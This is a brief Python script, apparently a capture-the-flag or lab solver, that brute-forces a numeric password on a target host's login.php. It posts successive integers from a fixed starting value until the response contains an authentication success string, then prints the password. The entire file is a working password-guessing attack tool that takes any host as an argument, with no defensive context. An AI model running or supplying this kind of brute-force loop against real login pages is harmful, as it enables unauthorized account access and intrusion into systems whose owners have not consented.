import requests
import sys

def bruteforce(rhost):

  i = 240610608
  while 1:

    url = "http://{}/login.php".format(rhost)

    headers = {"Content-Type": "application/x-www-form-urlencoded"}
    data = {"password": i}
    r = requests.post(url, headers=headers, data=data)
    print(i)
    if "you have been autheticated!" in r.text:
        print("Found Password! = {}".format(i))
        return i
    i+=1

def main():
    rhost = sys.argv[1]
    bruteforce(rhost)
  

if __name__ == "__main__":
    main()

  
